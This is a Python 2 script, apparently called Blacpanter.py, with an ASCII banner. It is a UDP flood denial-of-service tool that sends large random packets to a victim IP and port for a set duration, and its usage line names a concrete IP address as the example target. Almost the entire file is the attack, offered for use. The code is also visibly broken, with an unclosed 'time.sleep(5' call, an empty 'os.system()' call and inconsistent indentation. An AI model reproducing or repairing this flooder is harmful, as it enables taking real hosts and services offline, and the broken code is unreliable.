# -*- coding: utf-8 -*-
import time
import socket
import random
import sys
import os
import fade
os.system("git pull")
os.system("")
logo =  """
        @ @ @ @ @    @     @ @ @ @ @ @ @    @ @ @  @       @
        @         @  @      @         @   @        @     @
        @         @  @       @       @   @         @   @
        @ @ @ @ @    @        @     @    @         @ @
        @         @  @         @   @     @         @   @   
        @         @  @          @ @       @        @     @
        @ @ @ @ @    @ @ @ @ @   @          @ @ @  @       @
      
        @ @ @      @ @    @     @  @ @ @ @  @ @ @ @  @ @ @
              @  @     @  @ @   @     @     @        @     @
        @ @ @    @ @ @ @  @   @ @     @     @ @ @    @ @ @
        @        @     @  @     @     @     @ @ @ @  @     @
   °°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°
"""
print "starting in 5 seconds....."
time.sleep(5

def usage():
	os.system()
        print "Usage : python2 Blacpanter.py 196.220.60.200 80 100"

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mStatus \033[1;32m%s \033[1;91mSending packets to \033[1;32m%s \033[1;91mOn port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
